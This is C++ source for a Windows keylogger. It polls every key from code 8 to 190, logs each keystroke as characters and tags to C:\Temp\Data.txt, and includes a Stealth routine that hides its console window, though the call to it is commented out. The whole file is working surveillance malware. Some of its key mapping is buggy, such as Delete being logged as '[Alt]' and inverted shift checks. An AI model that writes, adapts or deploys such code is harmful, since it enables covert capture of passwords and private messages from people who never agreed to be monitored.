//
//  Keylog
//
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>    // These we need to
#include <stdio.h>
using namespace std;   // include to get our
#include <windows.h>   // Keylogger working.
#include <winuser.h>   

int Save(int key_stroke, char *file);
void Stealth();

int main()
{
	//SetPriorityClass( GetCurrentProcess(), HIGH_PRIORITY_CLASS);

	//Stealth();
	char i;

	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) Save(i, "C:\\Temp\\Data.txt");
		}
	}
	system("PAUSE");
	return 0;
}

int Save(int key_stroke, char *file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	//special characters
	if (key_stroke == 8)				fprintf(OUTPUT_FILE, "%s", "[Backspace]");
	else if (key_stroke == 13)			fprintf(OUTPUT_FILE, "%s", "[Enter]\n");
	else if (key_stroke == 32)			fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)		fprintf(OUTPUT_FILE, "%s", "[Tab]");
	else if (key_stroke == VK_SHIFT)	fprintf(OUTPUT_FILE, "%s", "");
	else if (key_stroke == VK_CONTROL)	fprintf(OUTPUT_FILE, "%s", "[Ctrl]");
	else if (key_stroke == VK_ESCAPE)	fprintf(OUTPUT_FILE, "%s", "[Esc]");
	else if (key_stroke == VK_END)		fprintf(OUTPUT_FILE, "%s", "[End]");
	else if (key_stroke == VK_HOME)		fprintf(OUTPUT_FILE, "%s", "[Home]");
	else if (key_stroke == VK_LEFT)		fprintf(OUTPUT_FILE, "%s", "[Left]");
	else if (key_stroke == VK_UP)		fprintf(OUTPUT_FILE, "%s", "[Up]");
	else if (key_stroke == VK_RIGHT)	fprintf(OUTPUT_FILE, "%s", "[Right]");
	else if (key_stroke == VK_DOWN)		fprintf(OUTPUT_FILE, "%s", "[Down]");
	else if (key_stroke == VK_PRIOR)	fprintf(OUTPUT_FILE, "%s", "[Pg Up]");
	else if (key_stroke == VK_NEXT)		fprintf(OUTPUT_FILE, "%s", "[Pg Dn]");
	else if (key_stroke == VK_PRINT)	fprintf(OUTPUT_FILE, "%s", "[Prt Scr]");
	else if (key_stroke == VK_MENU)		fprintf(OUTPUT_FILE, "%s", "[Alt]");
	else if (key_stroke == VK_DELETE)	fprintf(OUTPUT_FILE, "%s", "[Alt]");
	else if (key_stroke == VK_CAPITAL)	fprintf(OUTPUT_FILE, "%s", "");
	//numpad
	else if (key_stroke == VK_NUMPAD0)	fprintf(OUTPUT_FILE, "%s", "0");
	else if (key_stroke == VK_NUMPAD1)	fprintf(OUTPUT_FILE, "%s", "1");
	else if (key_stroke == VK_NUMPAD2)	fprintf(OUTPUT_FILE, "%s", "2");
	else if (key_stroke == VK_NUMPAD3)	fprintf(OUTPUT_FILE, "%s", "3");
	else if (key_stroke == VK_NUMPAD4)	fprintf(OUTPUT_FILE, "%s", "4");
	else if (key_stroke == VK_NUMPAD5)	fprintf(OUTPUT_FILE, "%s", "5");
	else if (key_stroke == VK_NUMPAD6)	fprintf(OUTPUT_FILE, "%s", "6");
	else if (key_stroke == VK_NUMPAD7)	fprintf(OUTPUT_FILE, "%s", "7");
	else if (key_stroke == VK_NUMPAD8)	fprintf(OUTPUT_FILE, "%s", "8");
	else if (key_stroke == VK_NUMPAD9)	fprintf(OUTPUT_FILE, "%s", "9");
	//numpad symbols

	//Function keys (F#)
	else if (key_stroke == VK_F1)		fprintf(OUTPUT_FILE, "%s", "[F1]");
	else if (key_stroke == VK_F2)		fprintf(OUTPUT_FILE, "%s", "[F2]");
	else if (key_stroke == VK_F3)		fprintf(OUTPUT_FILE, "%s", "[F3]");
	else if (key_stroke == VK_F4)		fprintf(OUTPUT_FILE, "%s", "[F4]");
	else if (key_stroke == VK_F5)		fprintf(OUTPUT_FILE, "%s", "[F5]");
	else if (key_stroke == VK_F6)		fprintf(OUTPUT_FILE, "%s", "[F6]");
	else if (key_stroke == VK_F7)		fprintf(OUTPUT_FILE, "%s", "[F7]");
	else if (key_stroke == VK_F8)		fprintf(OUTPUT_FILE, "%s", "[F8]");
	else if (key_stroke == VK_F9)		fprintf(OUTPUT_FILE, "%s", "[F9]");
	else if (key_stroke == VK_F10)		fprintf(OUTPUT_FILE, "%s", "[F10]");
	else if (key_stroke == VK_F11)		fprintf(OUTPUT_FILE, "%s", "[F11]");
	else if (key_stroke == VK_F12)		fprintf(OUTPUT_FILE, "%s", "[F12]");

	//period
	else if (key_stroke == 190 || key_stroke == 110)	fprintf(OUTPUT_FILE, "%s", ".");

	//symbols, totally screwy with shift
	else if(key_stroke >= 48 && key_stroke <= 57){
		if(GetKeyState(VK_SHIFT) != -32768){
			if(key_stroke == 48) 	  fprintf(OUTPUT_FILE, "%s", ")");
			else if(key_stroke == 49) fprintf(OUTPUT_FILE, "%s", "!");
			else if(key_stroke == 50) fprintf(OUTPUT_FILE, "%s", "@");
			else if(key_stroke == 51) fprintf(OUTPUT_FILE, "%s", "#");
			else if(key_stroke == 52) fprintf(OUTPUT_FILE, "%s", "$");
			else if(key_stroke == 53) {key_stroke = 37; fprintf(OUTPUT_FILE, "%s", &key_stroke);}
			else if(key_stroke == 54) fprintf(OUTPUT_FILE, "%s", "^");
			else if(key_stroke == 55) fprintf(OUTPUT_FILE, "%s", "&");
			else if(key_stroke == 56) fprintf(OUTPUT_FILE, "%s", "*");
			else if(key_stroke == 57) fprintf(OUTPUT_FILE, "%s", "(");
		}else{
			fprintf(OUTPUT_FILE, "%s", &key_stroke);
		}
	}

	//alphabet
	else if (key_stroke >= 65 && key_stroke <= 90){
		if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 && GetAsyncKeyState(VK_SHIFT) != -32768) 	  fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0 && GetAsyncKeyState(VK_SHIFT) == -32768) fprintf(OUTPUT_FILE, "%s", &key_stroke);
		else
		{
			key_stroke = key_stroke + 32;
			fprintf(OUTPUT_FILE, "%s", &key_stroke);
		}
	}
	//other
	else
	{
		fprintf(OUTPUT_FILE, "%s", &key_stroke);
	}
	fclose(OUTPUT_FILE);
	return 0;
}

/* *********************************** */

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

